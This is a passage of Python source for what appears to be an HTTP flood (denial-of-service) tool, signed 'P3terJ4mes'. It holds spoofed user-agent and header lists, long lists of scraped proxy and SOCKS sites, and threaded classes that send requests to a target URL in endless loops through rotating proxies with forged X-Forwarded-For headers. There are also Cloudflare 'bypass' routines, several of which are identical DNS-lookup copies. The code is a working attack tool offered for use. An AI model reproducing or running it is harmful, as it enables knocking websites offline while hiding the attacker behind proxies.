     'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba',
     'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba',
     'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba',
     'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba',
     'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba',
     'Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba',
     'Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
     'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
     'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50',
     'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65',
     'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70',
     'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
     'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
     'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0',
     'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0',
     'Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344',
     'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344',
     'Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 SonyEricssonP100/01; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525',
     'Mozilla/5.0 (Unknown; U; UNIX BSD/SYSV system; C -) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.2',
     'Mozilla/5.0 (webOS/1.3; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Desktop/1.0',
     'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0']
    acceptall = [
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept-Encoding: gzip, deflate\r\n',
     'Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n',
     'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n',
     'Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n',
     'Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n',
     'Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n',
     'Accept: text/html, application/xhtml+xml',
     'Accept-Language: en-US,en;q=0.5\r\n',
     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n',
     'Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n']
    nurlsproxies = [
     'http://www.aliveproxy.com/high-anonymity-proxy-list/', 'http://www.aliveproxy.com/anonymous-proxy-list/',
     'http://www.aliveproxy.com/fastest-proxies/', 'http://www.aliveproxy.com/us-proxy-list/', 'http://www.aliveproxy.com/gb-proxy-list/',
     'http://www.aliveproxy.com/fr-proxy-list/', 'http://www.aliveproxy.com/de-proxy-list/', 'http://www.aliveproxy.com/jp-proxy-list/',
     'http://www.aliveproxy.com/ca-proxy-list/', 'http://www.aliveproxy.com/ru-proxy-list/', 'http://www.aliveproxy.com/proxy-list-port-80/',
     'http://www.aliveproxy.com/proxy-list-port-81/', 'http://www.aliveproxy.com/proxy-list-port-3128/', 'http://www.aliveproxy.com/proxy-list-port-8000/',
     'http://www.aliveproxy.com/proxy-list-port-8080/', 'http://webanetlabs.net/publ/24', 'http://www.proxz.com/proxy_list_high_anonymous_0.html',
     'http://www.proxz.com/proxy_list_anonymous_us_0.html', 'http://www.proxz.com/proxy_list_uk_0.html', 'http://www.proxz.com/proxy_list_ca_0.html',
     'http://www.proxz.com/proxy_list_cn_ssl_0.html', 'http://www.proxz.com/proxy_list_jp_0.html', 'http://www.proxz.com/proxy_list_fr_0.html',
     'http://www.proxz.com/proxy_list_port_std_0.html', 'http://www.proxz.com/proxy_list_port_nonstd_0.html', 'http://www.proxz.com/proxy_list_transparent_0.html',
     'http://www.proxylists.net/', 'https://www.my-proxy.com/free-proxy-list.html', 'https://www.my-proxy.com/free-elite-proxy.html',
     'https://www.my-proxy.com/free-anonymous-proxy.html', 'https://www.my-proxy.com/free-transparent-proxy.html', 'https://cyber-hub.net/proxy/http.txt',
     'http://atomintersoft.com/anonymous_proxy_list', 'http://atomintersoft.com/high_anonymity_elite_proxy_list', 'http://www.proxylists.net/http_highanon.txt',
     'http://atomintersoft.com/products/alive-proxy/proxy-list', 'http://atomintersoft.com/products/alive-proxy/proxy-list?ap=9',
     'http://atomintersoft.com/products/alive-proxy/proxy-list/3128', 'http://atomintersoft.com/products/alive-proxy/proxy-list/com',
     'http://atomintersoft.com/products/alive-proxy/proxy-list/high-anonymity/', 'http://atomintersoft.com/transparent_proxy_listhttp://atomintersoft.com/proxy_list_domain_com',
     'http://atomintersoft.com/proxy_list_domain_edu', 'http://atomintersoft.com/proxy_list_domain_net',
     'http://atomintersoft.com/proxy_list_domain_org', 'http://atomintersoft.com/proxy_list_port_3128', 'http://atomintersoft.com/proxy_list_port_80',
     'http://atomintersoft.com/proxy_list_port_8000', 'http://atomintersoft.com/proxy_list_port_81', 'http://spys.ru/en/anonymous-proxy-list/',
     'http://best-proxy.com/english/search.php?search=anonymous-and-elite&country=any&type=anonymous-and-elite&port=any&ssl=any',
     'http://best-proxy.com/english/search.php?search=anonymous-and-elite&country=any&type=anonymous-and-elite&port=any&ssl=any&p=2',
     'http://best-proxy.com/english/search.php?search=anonymous-and-elite&country=any&type=anonymous-and-elite&port=any&ssl=any&p=3',
     'http://bestproxy.narod.ru/proxy2.html', 'http://rootjazz.com/proxies/proxies.txt', 'http://spys.ru/en/free-proxy-list/',
     'http://multiproxy.org/anon_proxy.htm', 'http://multiproxy.org/txt_all/proxy.txt', 'http://nntime.com/proxy-list-01.htm', 'http://samair.ru/proxy/proxy-30.htm',
     'http://nntime.com/proxy-list-02.htm', 'http://nntime.com/proxy-list-03.htm', 'http://nntime.com/proxy-list-04.htm', 'http://nntime.com/proxy-list-05.htm',
     'http://nntime.com/proxy-list-06.htm', 'http://nntime.com/proxy-list-07.htm', 'http://nntime.com/proxy-list-08.htm', 'http://nntime.com/proxy-list-09.htm',
     'http://nntime.com/proxy-list-10.htm', 'http://nntime.com/proxy-list-11.htm', 'http://nntime.com/proxy-list-12.htm', 'http://nntime.com/proxy-list-13.htm',
     'http://nntime.com/proxy-list-14.htm', 'http://nntime.com/proxy-list-15.htm', 'http://nntime.com/proxy-list-17.htm', 'http://nntime.com/proxy-list-18.htm',
     'http://nntime.com/proxy-list-19.htm', 'http://nntime.com/proxy-list-20.htm', 'http://nntime.com/proxy-list-21.htm', 'http://nntime.com/proxy-list-22.htm',
     'http://nntime.com/proxy-list-23.htm', 'http://nntime.com/proxy-list-24.htm', 'http://nntime.com/proxy-list-25.htm', 'http://nntime.com/proxy-list-27.htm',
     'http://nntime.com/proxy-list-28.htm', 'http://nntime.com/proxy-list-29.htm', 'http://nntime.com/proxy-list-30.htm', 'http://samair.ru/proxy/proxy-01.htm',
     'http://samair.ru/proxy/proxy-02.htm', 'http://samair.ru/proxy/proxy-03.htm', 'http://samair.ru/proxy/proxy-04.htm', 'http://samair.ru/proxy/proxy-05.htm',
     'http://samair.ru/proxy/proxy-06.htm', 'http://samair.ru/proxy/proxy-07.htm', 'http://samair.ru/proxy/proxy-08.htm', 'http://samair.ru/proxy/proxy-09.htm',
     'http://samair.ru/proxy/proxy-10.htm', 'http://samair.ru/proxy/proxy-11.htm', 'http://samair.ru/proxy/proxy-12.htm', 'http://samair.ru/proxy/proxy-13.htm',
     'http://samair.ru/proxy/proxy-14.htm', 'http://samair.ru/proxy/proxy-15.htm', 'http://samair.ru/proxy/proxy-16.htm', 'http://samair.ru/proxy/proxy-17.htm',
     'http://samair.ru/proxy/proxy-18.htm', 'http://samair.ru/proxy/proxy-19.htm', 'http://samair.ru/proxy/proxy-20.htm', 'http://samair.ru/proxy/proxy-21.htm',
     'http://samair.ru/proxy/proxy-22.htm', 'http://samair.ru/proxy/proxy-23.htm', 'http://samair.ru/proxy/proxy-24.htm', 'http://samair.ru/proxy/proxy-25.htm',
     'http://samair.ru/proxy/proxy-26.htm', 'http://samair.ru/proxy/proxy-27.htm', 'http://samair.ru/proxy/proxy-28.htm', 'http://samair.ru/proxy/proxy-29.htm']
    nurlssocks = [
     'https://www.my-proxy.com/free-socks-4-proxy.html', 'https://www.my-proxy.com/free-socks-5-proxy.html',
     'https://socks-list.blogspot.com/', 'https://sock5us.blogspot.com/', 'https://sockslist.blogspot.com/',
     'https://24h-sock.blogspot.com/2012/04/socks-proxy-list.html', 'https://socks5-lists.blogspot.com/',
     'http://atomintersoft.com/products/alive-proxy/socks5-list']

    def buildLock(size):
        out_str = ''
        _LOWERCASE = list(range(97, 122))
        _UPPERCASE = list(range(65, 90))
        _NUMERIC = list(range(48, 57))
        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
        for i in range(0, size):
            code = random.choice(validChars)
            out_str += chr(code)
        else:
            return out_str


    class RequestsSockets(threading.Thread):

        def __init__(self, url, number, listsproxy, choice, setup):
            threading.Thread.__init__(self)
            self.url = url
            self.num = number
            self.Lock = threading.Lock()
            self.listsproxy = listsproxy
            self.choice = choice
            self.setup = setup

        def requestsHttpFloodSocketsHttp(self):
            global request_num
            if self.choice == 'http':
                port = '80'
            if self.choice == 'https':
                port = '443'
            randomip = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            clientip = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            buildips = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            fakerips = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            try:
                host = self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            except:
                host = self.url.replace('http://', '').replace('https://', '').split('/')[0]
            else:
                get_host = 'GET ' + self.url + ' HTTP/1.1\r\nHost: ' + host + '\r\n'
                useragent = 'User-Agent: ' + random.choice(useragents) + '\r\n'
                accept = random.choice(acceptall)
                forward = 'X-Forwarded-For: ' + randomip + clientip + '\r\n'
                forward += 'Client-IP: ' + buildips + fakerips + '\r\n'
                connection = 'Connection: Keep-Alive\r\n'
                request = get_host + useragent + accept + forward + connection + '\r\n'
                numberlist = 0
                if numberlist > len(self.listsproxy):
                    proxies = self.listsproxy[numberlist].split(':')
                else:
                    proxies = random.choice(self.listsproxy).split(':')
                self.setup.wait()
                while True:
                    try:
                        socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxies[0]), int(proxies[1]), True)
                        sockets = socks.socksocket()
                        sockets.connect((str(host), int(port)))
                        if str(port) == '443':
                            sockets = ssl.wrap_socket(sockets)
                        sockets.send(str.encode(request))
                        request_num += 1
                        print((Fore.GREEN + '[+] Http Flood ===>>> Sockets: ' + str(request_num) + ' Done: ' + str(self.num) + ' Http: ' + str(proxies[0] + ':' + proxies[1])), end='')
                        try:
                            for x in range(self.num):
                                sockets.send(str.encode(request))

                        except:
                            sockets.close()

                    except Exception:
                        print(Fore.CYAN + '[-] Http Flood With Http --Down or Dead--. or Web Block SSL_HTTPS Retrying request !!!\n')
                        sockets.close()

        def requestsHttpFloodSocketsSock4(self):
            global request_num
            port = '80'
            randomip = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            clientip = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            buildips = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            fakerips = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            try:
                host = self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            except:
                host = self.url.replace('http://', '').replace('https://', '').split('/')[0]
            else:
                get_host = 'GET ' + self.url + ' HTTP/1.1\r\nHost: ' + host + '\r\n'
                useragent = 'User-Agent: ' + random.choice(useragents) + '\r\n'
                accept = random.choice(acceptall)
                forward = 'X-Forwarded-For: ' + randomip + clientip + '\r\n'
                forward += 'Client-IP: ' + buildips + fakerips + '\r\n'
                connection = 'Connection: Keep-Alive\r\n'
                request = get_host + useragent + accept + forward + connection + '\r\n'
                numberlist = 0
                if numberlist > len(self.listsproxy):
                    proxies = self.listsproxy[numberlist].split(':')
                else:
                    proxies = random.choice(self.listsproxy).split(':')
                self.setup.wait()
                while True:
                    try:
                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxies[0]), int(proxies[1]), True)
                        sockets = socks.socksocket()
                        sockets.connect((str(host), int(port)))
                        sockets.send(str.encode(request))
                        request_num += 1
                        print((Fore.GREEN + '[+] Http Flood ===>>> Sockets: ' + str(request_num) + ' Done: ' + str(self.num) + ' Socks4: ' + str(proxies[0] + ':' + proxies[1])), end='')
                        try:
                            for x in range(self.num):
                                sockets.send(str.encode(request))

                        except:
                            sockets.close()

                    except:
                        print(Fore.CYAN + '[-] Http Flood With Socks4 --Down or Dead--. Retrying request !!!\n')
                        sockets.close()

        def requestsHttpFloodSocketsSock5(self):
            global request_num
            port = '80'
            randomip = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            clientip = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            buildips = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            fakerips = str(random.randint(0, 255)) + '.' + str(random.randint(0, 255))
            try:
                host = self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            except:
                host = self.url.replace('http://', '').replace('https://', '').split('/')[0]
            else:
                get_host = 'GET ' + self.url + ' HTTP/1.1\r\nHost: ' + host + '\r\n'
                useragent = 'User-Agent: ' + random.choice(useragents) + '\r\n'
                accept = random.choice(acceptall)
                forward = 'X-Forwarded-For: ' + randomip + clientip + '\r\n'
                forward += 'Client-IP: ' + buildips + fakerips + '\r\n'
                connection = 'Connection: Keep-Alive\r\n'
                request = get_host + useragent + accept + forward + connection + '\r\n'
                numberlist = 0
                if numberlist > len(self.listsproxy):
                    proxies = self.listsproxy[numberlist].split(':')
                else:
                    proxies = random.choice(self.listsproxy).split(':')
                self.setup.wait()
                while True:
                    try:
                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxies[0]), int(proxies[1]), True)
                        sockets = socks.socksocket()
                        sockets.connect((str(host), int(port)))
                        sockets.send(str.encode(request))
                        request_num += 1
                        print((Fore.GREEN + '[+] Http Flood ===>>> Sockets: ' + str(request_num) + ' Done: ' + str(self.num) + ' Socks5: ' + str(proxies[0] + ':' + proxies[1])), end='')
                        try:
                            for x in range(self.num):
                                sockets.send(str.encode(request))

                        except:
                            print(Fore.CYAN + '[-] Http Flood With Socks5 --Down or Dead--. Retrying request !!!\n')
                            sockets.close()

                    except:
                        sockets.close()
                        try:
                            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxies[0]), int(proxies[1]), True)
                            sockets = socks.socksocket()
                            sockets.connect((str(host), int(port)))
                            sockets.send(str.encode(request))
                            request_num += 1
                            print((Fore.GREEN + '[+] Http Flood ===>>> Sockets: ' + str(request_num) + ' Done: ' + str(self.num) + ' Socks4: ' + str(proxies[0] + ':' + proxies[1])), end='')
                            try:
                                for x in range(self.num):
                                    sockets.send(str.encode(request))

                            except:
                                sockets.close()

                        except:
                            print(Fore.CYAN + '[-] Http Flood With Socks4 --Down or Dead--. Retrying request !!!\n')
                            sockets.close()

        def run(self):
            self.Lock.acquire()
            self.Lock.release()
            while True:
                try:
                    if self.choice == 'http':
                        self.requestsHttpFloodSocketsHttp()
                    if self.choice == 'https':
                        self.requestsHttpFloodSocketsHttp()
                    if self.choice == 'sock4':
                        self.requestsHttpFloodSocketsSock4()
                    if self.choice == 'sock5':
                        self.requestsHttpFloodSocketsSock5()
                except socket.timeout:
                    print(Fore.CYAN + '[+] Connection timeout , Sockets done-Host might Down!!!\n')
                except ValueError:
                    print(Fore.RED + '[+] Checking The URL or Something ERROR !!!\n')
                except KeyboardInterrupt:
                    exit(Fore.RED + '[-] Canceled By P3terJ4mes !!!')
                except Exception:
                    sys.stdout.write(Fore.RED + '[+] The Host May Be DIE or Proxy DEAD or Not Connect Internet !!!\n')


    class RequestsDefault(threading.Thread):

        def __init__(self, url, number, proxy, choice, mode, setup):
            threading.Thread.__init__(self)
            self.url = url
            self.num = number
            self.Lock = threading.Lock()
            self.proxy = proxy
            self.choice = choice
            self.mode = mode
            self.setup = setup

        def requestsCloudFlareDefault(self):
            global request_num
            self.setup.wait()
            while True:
                try:
                    host = self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
                    try:
                        cloudflareDNS = dns.resolver.Resolver()
                        bypass_ip = cloudflareDNS.query(host, 'A')
                        for real_ip in bypass_ip:
                            request_num += 1
                            print((Fore.GREEN + '[+]CF-Bypass Real IP-DNS : %s Done: %s Proxy: %s' % (real_ip, request_num, self.proxy)), end='')

                    except:
                        print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

                except Exception:
                    print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

        def requestsHttpFloodDefault(self):
            global request_num
            self.setup.wait()
            while True:
                try:
                    host = self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
                    try:
                        cloudflareDNS = dns.resolver.Resolver()
                        bypass_ip = cloudflareDNS.query(host, 'A')
                        for real_ip in bypass_ip:
                            request_num += 1
                            print((Fore.GREEN + '[+]CF-Bypass Real IP-DNS : %s Done: %s Proxy: %s' % (real_ip, request_num, self.proxy)), end='')

                    except:
                        print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

                except Exception:
                    print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

        def requestsCloudFlareCookies(self):
            global request_num
            try:
                if self.choice == 'http':
                    proxies = {'http://': 'http://' + self.proxy}
                if self.choice == 'https':
                    proxies = {'https://': 'https://' + self.proxy}
                if self.choice == 'sock4':
                    proxies = {'sock4://': 'sock4://' + self.proxy}
                if self.choice == 'sock5':
                    proxies = {'sock5://': 'sock4://' + self.proxy}
                useragents = UserAgent(use_cache_server=True, cache=True)
                headers = {'User-Agent':useragents.random,  'Referer':random.choice(referers) + self.url}
            except:
                pass
            else:
                self.setup.wait()
                while True:
                    try:
                        cookie_value = cfscrape.get_cookie_string((self.url), headers=headers, proxies=proxies)
                        request_num += 1
                        print(Fore.GREEN + '[+] CF-Bypass Finding the Cookies Part: ' + str(request_num) + 'Proxy: ' + self.proxy)
                    except:
                        print(Fore.CYAN + "[-] CF-Bypass is On UAM-Capcha-BotFightMode, Can't find Cookies !!!\n")

        def requestsFindRealIP_CF_SSH(self):
            global request_num
            self.setup.wait()
            while True:
                try:
                    host = self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
                    try:
                        cloudflareDNS = dns.resolver.Resolver()
                        bypass_ip = cloudflareDNS.query(host, 'A')
                        for real_ip in bypass_ip:
                            request_num += 1
                            print((Fore.GREEN + '[+]CF-Bypass Real IP-DNS : %s Done: %s Proxy: %s' % (real_ip, request_num, self.proxy)), end='')

                    except:
                        print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

                except Exception:
                    print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

        def requestsFindRealIP_CF_DNS(self):
            global request_num
            self.setup.wait()
            while True:
                try:
                    host = self.url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
                    try:
                        cloudflareDNS = dns.resolver.Resolver()
                        bypass_ip = cloudflareDNS.query(host, 'A')
                        for real_ip in bypass_ip:
                            request_num += 1
                            print((Fore.GREEN + '[+]CF-Bypass Real IP-DNS : %s Done: %s Proxy: %s' % (real_ip, request_num, self.proxy)), end='')

                    except:
                        print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

                except Exception:
                    print(Fore.RED + "[-] Can't Find Host or Real IP-DNS with CloudFlare !!!\n")

        def run(self):
            self.Lock.acquire()
            self.Lock.release()
            while True:
                try:
                    if self.mode == '1':
                        self.requestsHttpFloodDefault()
                    if self.mode == '2':
                        self.requestsCloudFlareDefault()
                    if self.mode == '4':
                        self.requestsCloudFlareCookies()
                    if self.mode == '5':
                        self.requestsFindRealIP_CF_SSH()
                    if self.mode == '6':
                        self.requestsFindRealIP_CF_DNS()
                except ValueError:
                    print(Fore.RED + '[+] Checking The URL or Something ERROR !!!\n')
                except KeyboardInterrupt:
                    exit(Fore.RED + '[-] Canceled By P3terJ4mes !!!')
                except Exception:
                    sys.stdout.write(Fore.RED + '[+] The Host May Be DIE or Proxy DEAD or Not Connect Internet !!!\n')


    def checkProxyLists(lines, proxy_type, timeoutCheck):
        global numberChecks
        host = 'www.google.com'
        try:
            proxy = lines.strip().split(':')
            if proxy_type == 3:
                port = '443'
                socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True)
            if proxy_type != 3:
                port = '80'
                if proxy_type == 1:
                    socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True)
                if proxy_type == 4:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                if proxy_type == 5:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
        except:
            pass
        else:
            errorCheck = 0
            while True:
                if errorCheck == 3:
                    proxies_num.remove(lines)
                    break
                try:
                    checkProxies = socks.socksocket()
                    checkProxies.settimeout(timeoutCheck)
                    checkProxies.connect((str(host), int(port)))
                    if port == 443:
                        checkProxies = ssl.wrap_socket(checkProxies)
                    checkProxies.send(str.encode('GET / HTTP/1.1\r\n\r\n'))
                    checkProxies.close()
                    break
                except Exception:
                    errorCheck += 1

            numberChecks += 1


    class JapanTools:

        def getProxy(self, url_GetProxies, choice):
            a = urllib.request.Request(url_GetProxies)
            a.add_header('User-Agent', random.choice(useragents))
            sourcecode = urllib.request.urlopen(a, timeout=10)
            part = str(sourcecode.read())
            part = part.split('<tbody>')
            part = part[1].split('</tbody>')
            part = part[0].split('<tr><td>')
            proxiesHttp = ''
            proxiesHttps = ''
            proxiesSock4 = ''
            for proxy in part:
                proxy = proxy.split('</td><td>')
                try:
                    if choice == 'http':
                        proxiesHttp = proxiesHttp + proxy[0] + ':' + proxy[1] + '\n'
                    if choice == 'https':
                        proxiesHttps = proxiesHttps + proxy[0] + ':' + proxy[1] + '\n'
                    if choice == 'sock4':
                        proxiesSock4 = proxiesSock4 + proxy[0] + ':' + proxy[1] + '\n'
                except:
                    pass

            else:
                if choice == 'http':
                    proxy_http = open('http.txt', 'a')
                    proxy_http.write(proxiesHttp)
                    proxy_http.close()
                if choice == 'https':
                    proxy_https = open('https.txt', 'a')
                    proxy_https.write(proxiesHttps)
                    proxy_https.close()
                if choice == 'sock4':
                    proxy_Sock4 = open('socks4.txt', 'a')
                    proxy_Sock4.write(proxiesSock4)
                    proxy_Sock4.close()

        def getProxyScanWeb(self, url_GetProxies4, word, words, choice):
            try:
                soup = BeautifulSoup((urllib.request.urlopen(url_GetProxies4)), features='lxml')
                for tag in soup.find_all(words, word):
                    links = tag.a.get('href')
                    result = urllib.request.urlopen(links)
                    for line in result:
                        ipweb = re.findall('(?:[\\d]{1,3})\\.(?:[\\d]{1,3})\\.(?:[\\d]{1,3})\\.(?:[\\d]{1,3}):(?:[\\d]{1,5})', str(line))

                    if ipweb:
                        for x in ipweb:
